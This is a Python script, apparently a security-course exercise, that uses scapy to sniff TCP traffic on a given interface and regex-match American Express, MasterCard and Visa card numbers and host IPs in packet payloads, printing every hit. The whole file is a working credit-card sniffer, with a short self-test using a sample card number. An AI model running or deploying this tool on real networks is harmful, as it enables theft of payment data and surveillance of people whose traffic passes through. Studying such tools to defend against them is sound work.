import re
import optparse
from scapy.all import *

def find_credit_card1(raw):
    america_re = re.findall("3[47][0-9]{13}", raw)
    if america_re:
        print("[+] Found American Express Card: " + america_re[0])
    
    master_re = re.findall("5[1-5][0-9]{14}", raw)
    if master_re:
        print("[+] Found MasterCard Card: " + master_re[0])

    visa_re = re.findall("4[0-9]{12}(?:[0-9]{3})?", raw)
    if visa_re:
        print("[+] Found Visa Card: " + visa_re[0])

def find_credit_card2(pkt):
    raw = pkt.sprintf("%Raw.load%")
    #print(raw)
    host_re = re.findall("Host: (?:[0-9]{1,3}\.){3}[0-9]{1,3}", raw)
    if host_re:
        print("[+] Found Host: " + host_re[0])
    america_re = re.findall("3[47][0-9]{13}", raw)
    if america_re:
        print("[+] Found American Express Card: " + america_re[0])
    
    master_re = re.findall("5[1-5][0-9]{14}", raw)
    if master_re:
        print("[+] Found MasterCard Card: " + master_re[0])

    visa_re = re.findall("4[0-9]{12}(?:[0-9]{3})?", raw)
    if visa_re:
        print("[+] Found Visa Card: " + visa_re[0])

def main1():
    tests = []
    tests.append("I would like to buy 1337 copies of that dvd")
    tests.append("Bill my card: 378282246310005 for \$2600")
    for test in tests:
        find_credit_card1(test)

def main2():
    parser = optparse.OptionParser("Usage: prog -i <interface>")
    parser.add_option("-i", dest="interface", type="string", help="specify interface to listen on")
    (options, args) = parser.parse_args()
    if options.interface is None:
        print(parser.usage)
        exit(0)
    
    conf.iface = options.interface

    try:
        print("[*] Starting Credit Card Sniffer")
        sniff(filter="tcp", prn=find_credit_card2, store=0)
    except KeyboardInterrupt:
        exit(0)

if __name__ == "__main__":
    main1()
    main2()